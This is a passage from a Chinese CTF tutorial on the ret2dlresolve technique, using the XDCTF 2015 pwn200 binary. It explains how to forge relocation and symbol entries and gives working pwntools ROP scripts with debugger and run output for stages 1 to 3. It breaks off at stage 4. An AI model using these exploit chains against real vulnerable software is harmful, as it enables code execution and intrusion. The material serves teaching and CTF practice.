reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下</p>\n<ol>\n<li><p>控制程序执行dl_resolve函数</p>\n</li>\n<li><ul>\n<li>给定Link_map以及index两个参数。</li>\n<li>当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。</li>\n</ul>\n</li>\n<li><p>控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</p>\n</li>\n<li><p>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</p>\n</li>\n<li><p>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>\n</li>\n</ol>\n<p><strong>此外，这个攻击成功的很必要的条件</strong></p>\n<ul>\n<li><strong>dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</strong></li>\n<li><strong>dl_resolve函数最后的解析根本上依赖于所给定的字符串。</strong></li>\n</ul>\n<p><strong>注意</strong>：</p>\n<ul>\n<li><p>符号版本信息</p>\n</li>\n<li><ul>\n<li>最好使得ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为0，以便于防止找不到的情况。</li>\n</ul>\n</li>\n<li><p>重定位表项</p>\n</li>\n<li><ul>\n<li>r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</li>\n</ul>\n</li>\n</ul>\n<p><strong>攻击条件</strong></p>\n<p>说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。</p>\n<p><strong>以XDCTF 2015的pwn200为例</strong></p>\n<p>首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main</span><br></pre></td></tr></table></figure>\n\n<p>在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。</p>\n<pre><code>1. 利用正常的代码来使用该技巧从而获取shell。\n \\-  stage 1 测试控制程序执行write函数的效果。\n \\-  stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。\n \\-  stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。\n</code></pre>\n<ol start=\"2\">\n<li>利用roputils中已经集成好的工具来实现攻击，从而获取shell。</li>\n</ol>\n<p><strong>正常攻击</strong></p>\n<p>显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  pattern create 200</span><br><span class=\"line\">[+] Generating a pattern of 200 bytes</span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class=\"line\">[+] Saved as &#x27;$_gef0&#x27;</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main</span><br><span class=\"line\">Welcome to XDCTF2015~!</span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\">0x62616164 in ?? ()</span><br><span class=\"line\">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]──────────────────────────────────────────────────────────</span><br><span class=\"line\">$eax   : 0x000000c9</span><br><span class=\"line\">$ebx   : 0x00000000</span><br><span class=\"line\">$ecx   : 0xffffcc6c  →  &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span><br><span class=\"line\">$edx   : 0x00000100</span><br><span class=\"line\">$esp   : 0xffffcce0  →  &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;</span><br><span class=\"line\">$ebp   : 0x62616163 (&quot;caab&quot;?)</span><br><span class=\"line\">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class=\"line\">$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001</span><br><span class=\"line\">$eip   : 0x62616164 (&quot;daab&quot;?)</span><br><span class=\"line\">$cs    : 0x00000023</span><br><span class=\"line\">$ss    : 0x0000002b</span><br><span class=\"line\">$ds    : 0x0000002b</span><br><span class=\"line\">$es    : 0x0000002b</span><br><span class=\"line\">$fs    : 0x00000000</span><br><span class=\"line\">$gs    : 0x00000063</span><br><span class=\"line\">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────────────────</span><br><span class=\"line\">[!] Cannot disassemble from $PC</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────────────────</span><br><span class=\"line\">[&#x27;0xffffcce0&#x27;, &#x27;l8&#x27;]</span><br><span class=\"line\">8</span><br><span class=\"line\">0xffffcce0│+0x00: &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;  ← $esp</span><br><span class=\"line\">0xffffcce4│+0x04: &quot;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]&quot;</span><br><span class=\"line\">0xffffcce8│+0x08: &quot;gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]&quot;</span><br><span class=\"line\">0xffffccec│+0x0c: &quot;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]&quot;</span><br><span class=\"line\">0xffffccf0│+0x10: &quot;iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]&quot;</span><br><span class=\"line\">0xffffccf4│+0x14: &quot;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]&quot;</span><br><span class=\"line\">0xffffccf8│+0x18: &quot;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]&quot;</span><br><span class=\"line\">0xffffccfc│+0x1c: &quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]&quot;</span><br><span class=\"line\">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class=\"line\">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\">gef➤  pattern search</span><br><span class=\"line\">[!] Syntax</span><br><span class=\"line\">pattern search PATTERN [SIZE]</span><br><span class=\"line\">gef➤  pattern search 0x62616164</span><br><span class=\"line\">[+] Searching &#x27;0x62616164&#x27;</span><br><span class=\"line\">[+] Found at offset 112 (little-endian search) likely</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 1</strong></p>\n<p>这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步</p>\n<ol>\n<li>将栈迁移到bss段。</li>\n<li>控制write函数输出相应字符串。</li>\n</ol>\n<p>这里主要使用了pwntools中的ROP模块。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write cmd=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop.write(<span class=\"number\">1</span>, base_stage + <span class=\"number\">80</span>, <span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>结果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage1.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 120912</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 2</strong></p>\n<p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write cmd=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">write_index = (elf.plt[<span class=\"string\">&#x27;write&#x27;</span>] - plt0) / <span class=\"number\">16</span> - <span class=\"number\">1</span></span><br><span class=\"line\">write_index *= <span class=\"number\">8</span></span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(write_index)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下，仍然输出了cmd对应的字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage2.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 123406</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 3</strong></p>\n<p>这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。</p>\n<p>鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ readelf -r main  </span><br><span class=\"line\">重定位节 &#x27;.rel.dyn&#x27; 位于偏移量 0x318 含有 3 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class=\"line\">0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0</span><br><span class=\"line\">0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0</span><br><span class=\"line\">重定位节 &#x27;.rel.plt&#x27; 位于偏移量 0x330 含有 5 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class=\"line\">0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class=\"line\">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class=\"line\">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class=\"line\">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>\n\n<p>可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = <span class=\"number\">0x607</span></span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(write_got)  <span class=\"comment\"># fake reloc</span></span><br><span class=\"line\">rop.raw(r_info)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage3.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 126063</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 4</strong></p>\n<p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607&gt;&gt;8=0x6。因此，我们知道write对应的符号地址为0x8048238。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main</span><br><span class=\"line\">main：     文件格式 elf32-i386</span><br><span class=\"line\">Contents of section .dynsym:</span><br><span class=\"line\"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class=\"line\"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class=\"line\"> 80481f8 27000000 00000000 00000000 12000000  &#x27;...............</span><br><span class=\"line\"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span><br><span class=\"line\"> 8048218 20000000 00000000 00000000 12000000   ...............</span><br><span class=\"line\"> 8048228 3a000000 00000000 00000000 12000000  :...............</span><br><span class=\"line\"> 8048238 4c000000 00000000 00000000 12000000  L...............</span><br><span class=\"line\"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span><br><span class=\"line\"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span><br><span class=\"line\"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span><br></pre></td></tr></table></figure>\n\n<p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 